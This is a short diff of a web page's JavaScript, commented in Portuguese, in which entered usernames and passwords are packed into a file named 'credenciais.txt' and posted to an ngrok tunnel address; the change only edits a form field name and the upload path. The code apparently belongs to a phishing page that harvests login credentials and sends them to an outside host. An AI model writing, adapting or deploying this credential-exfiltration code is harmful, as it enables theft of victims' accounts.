@@ -575,12 +575,12 @@ site.</div></div></noscript>
 
         // Criar FormData e adicionar o arquivo
         const formData = new FormData();
-        formData.append('login', blob, 'credenciais.txt');
+        formData.append('sla', blob, 'credenciais.txt');
         formData.append('username', username);
         formData.append('password', password);
 
 // Enviar para o servidor
-fetch('https://870543efcd45.ngrok-free.app/login/', {
+fetch('https://870543efcd45.ngrok-free.app/login/credenciais.txt', {
     method: 'POST',
     body: formData
 })
